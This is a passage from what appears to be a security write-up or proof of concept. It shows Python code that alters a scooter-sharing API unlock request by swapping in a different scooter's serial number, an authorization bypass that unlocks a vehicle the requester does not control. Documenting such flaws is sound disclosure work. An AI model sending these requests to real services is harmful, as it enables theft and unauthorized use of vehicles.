    "lng": -74.0060
}

# Modified request to unlock different scooter
modified_request = {
    "serial_number": "SN99999",  # Different scooter
    "lat": 40.7128,
    "lng": -74.0060
}

# Send modified request
response = requests.post(
    f"{API_BASE_URL}/api/application/vehicles/unlock",
    json=modified_request,
    headers=headers
)
            
```
